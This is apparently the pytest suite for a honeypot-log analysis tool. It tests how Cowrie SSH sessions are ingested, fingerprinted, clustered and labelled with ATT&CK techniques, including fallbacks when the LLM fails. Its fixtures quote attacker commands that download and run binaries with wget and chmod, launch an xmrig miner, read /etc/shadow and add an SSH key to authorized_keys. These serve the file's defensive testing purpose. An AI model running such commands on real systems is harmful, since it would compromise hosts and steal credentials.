import json
import subprocess
import sys

import mongomock
import pytest

from honeylens import analyze, ingest
from honeylens.fingerprint import classify_session, normalize_command
from honeylens.llm import RuleAnalyzer


@pytest.fixture
def db():
    return mongomock.MongoClient(tz_aware=True)["test"]


def write_log(path, events):
    with open(path, "a") as f:
        for e in events:
            f.write(json.dumps(e) + "\n")


def ev(eventid, sid="s1", ts="2026-11-18T12:00:00.000000Z", **kw):
    return {"eventid": eventid, "session": sid, "src_ip": "198.51.100.7", "timestamp": ts, **kw}


# --- fingerprinting -------------------------------------------------------

def test_same_script_different_details_same_fingerprint():
    a = {"commands": [{"input": "cd /tmp; wget http://1.2.3.4/x86 -O .k82jfQ; chmod +x .k82jfQ"}]}
    b = {"commands": [{"input": "cd /tmp; wget http://9.9.9.9/x86 -O .zz91ab; chmod +x .zz91ab"}]}
    assert classify_session(a) == classify_session(b)


def test_different_scripts_different_fingerprint():
    a = {"commands": [{"input": "uname -a"}]}
    b = {"commands": [{"input": "cat /etc/shadow"}]}
    assert classify_session(a)[0] != classify_session(b)[0]


def test_normalize_replaces_volatile_parts():
    out = normalize_command("echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ== me >> ~/.ssh/authorized_keys")
    assert "<SSHKEY>" in out and "AAAA" not in out
    assert normalize_command("ping 10.0.0.1") == "ping <IP>"


def test_static_kinds():
    assert classify_session({})[1] == "scan"
    assert classify_session({"login_failed": 3})[1] == "bruteforce"
    assert classify_session({"login_success": 1})[1] == "login_only"


# --- ingest ---------------------------------------------------------------

def test_ingest_builds_sessions_and_is_incremental(db, tmp_path):
    log = tmp_path / "cowrie.json"
    write_log(log, [
        ev("cowrie.session.connect", dst_port=22),
        ev("cowrie.login.failed", username="root", password="123456"),
        ev("cowrie.login.success", username="root", password="admin"),
        ev("cowrie.command.input", input="uname -a"),
    ])
    assert ingest.ingest_file(db, str(log)) == 4
    assert ingest.ingest_file(db, str(log)) == 0  # nothing new
    write_log(log, [ev("cowrie.session.closed", ts="2026-11-18T12:00:05.000000Z", duration=5.0)])
    assert ingest.ingest_file(db, str(log)) == 1

    s = db.sessions.find_one({"_id": "s1"})
    assert s["login_failed"] == 1 and s["login_success"] == 1
    assert s["commands"][0]["input"] == "uname -a"
    assert s["closed"] is True and s["password"] == "admin"
    assert db.logins.count_documents({}) == 2


def test_partial_line_waits(db, tmp_path):
    log = tmp_path / "cowrie.json"
    log.write_text(json.dumps(ev("cowrie.session.connect")) + "\n" + '{"eventid": "cowrie.lo')
    assert ingest.ingest_file(db, str(log)) == 1


# --- analysis -------------------------------------------------------------

class FakeLLM:
    source = "fake"

    def analyze(self, commands, downloads, login):
        return {
            "name": "Miner", "intent": "cryptomining", "summary": "s", "explanation": "e",
            "severity": "HIGH",
            "techniques": [{"id": "T1105", "evidence": "wget"}, {"id": "T9999", "evidence": "made up"},
                           {"id": "t1496.001", "evidence": "xmrig"}],
            "iocs": ["http://x"],
        }


def test_validate_drops_hallucinated_ids():
    r = analyze.validate(FakeLLM().analyze([], [], {}), "fake")
    assert [t["id"] for t in r["techniques"]] == ["T1105", "T1496.001"]
    assert r["rejected_techniques"] == ["T9999"]
    assert r["severity"] == "high"


def test_cluster_and_analyze_end_to_end(db, tmp_path):
    log = tmp_path / "cowrie.json"
    events = []
    for i, ip in enumerate(["1.1.1.1", "2.2.2.2", "3.3.3.3"]):
        sid = f"bot{i}"
        events += [
            ev("cowrie.login.success", sid=sid, username="root", password="root"),
            ev("cowrie.command.input", sid=sid, input=f"wget http://{ip}/xmrig; ./xmrig"),
            ev("cowrie.session.closed", sid=sid),
        ]
    events += [ev("cowrie.login.failed", sid="brute", username="a", password="b"),
               ev("cowrie.session.closed", sid="brute")]
    write_log(log, events)
    ingest.ingest_file(db, str(log))

    assert analyze.cluster_sessions(db) == 4
    cmd = list(db.clusters.find({"kind": "commands"}))
    assert len(cmd) == 1 and cmd[0]["session_count"] == 3  # 3 bots -> 1 pattern
    assert db.clusters.find_one({"_id": "static-bruteforce"})["analysis"]["source"] == "static"

    llm = FakeLLM()
    assert analyze.analyze_clusters(db, llm, max_calls=10) == 1
    assert analyze.analyze_clusters(db, llm, max_calls=10) == 0  # never re-asks the LLM
    assert db.clusters.find_one({"kind": "commands"})["analysis"]["name"] == "Miner"


def test_rule_analyzer_baseline():
    r = RuleAnalyzer().analyze(
        ["cd /tmp; wget http://x/y", "chmod +x y", "echo key >> ~/.ssh/authorized_keys"], [], {})
    ids = {t["id"] for t in r["techniques"]}
    assert {"T1105", "T1222.002", "T1098.004", "T1059.004"} <= ids


def test_demo_seed_runs(tmp_path, db):
    out = tmp_path / "demo.json"
    subprocess.run([sys.executable, "-m", "honeylens.seed_demo", "--out", str(out), "--sessions", "300"],
                   check=True, capture_output=True)
    assert ingest.ingest_file(db, str(out)) > 300
    analyze.cluster_sessions(db)
    # each demo script family collapses into one pattern despite random IPs/names
    assert db.clusters.count_documents({"kind": "commands"}) <= 6


class BusyLLM:
    source = "busy"
    calls = 0

    def analyze(self, commands, downloads, login):
        BusyLLM.calls += 1
        raise RuntimeError("503 UNAVAILABLE. This model is currently experiencing high demand.")


class BrokenLLM:
    source = "broken"

    def analyze(self, commands, downloads, login):
        raise ValueError("model returned invalid JSON")


def _one_command_cluster(db, tmp_path):
    log = tmp_path / "c.json"
    write_log(log, [ev("cowrie.login.success", sid="x", username="root", password="root"),
                    ev("cowrie.command.input", sid="x", input="wget http://1.2.3.4/a; chmod +x a"),
                    ev("cowrie.session.closed", sid="x")])
    ingest.ingest_file(db, str(log))
    analyze.cluster_sessions(db)


def test_temporary_errors_never_give_up(db, tmp_path):
    _one_command_cluster(db, tmp_path)
    for _ in range(10):
        assert analyze.analyze_clusters(db, BusyLLM(), max_calls=10) == 0
    c = db.clusters.find_one({"kind": "commands"})
    assert c["needs_analysis"] is True and "analysis" not in c  # still waiting, not abandoned
    # service recovers -> it gets analyzed
    assert analyze.analyze_clusters(db, FakeLLM(), max_calls=10) == 1


def test_busy_service_stops_the_cycle_early(db, tmp_path):
    _one_command_cluster(db, tmp_path)
    log = tmp_path / "d.json"
    write_log(log, [ev("cowrie.login.success", sid="y", username="root", password="root"),
                    ev("cowrie.command.input", sid="y", input="cat /etc/shadow"),
                    ev("cowrie.session.closed", sid="y")])
    ingest.ingest_file(db, str(log))
    analyze.cluster_sessions(db)
    BusyLLM.calls = 0
    analyze.analyze_clusters(db, BusyLLM(), max_calls=10)
    assert BusyLLM.calls == 1  # didn't retry every cluster against a busy server


def test_hard_errors_fall_back_to_rules(db, tmp_path):
    _one_command_cluster(db, tmp_path)
    for _ in range(analyze.MAX_HARD_ERRORS):
        analyze.analyze_clusters(db, BrokenLLM(), max_calls=10)
    c = db.clusters.find_one({"kind": "commands"})
    assert c["needs_analysis"] is False
    assert c["analysis"]["source"] == "rules (LLM failed)"
    assert any(t["id"] == "T1105" for t in c["analysis"]["techniques"])
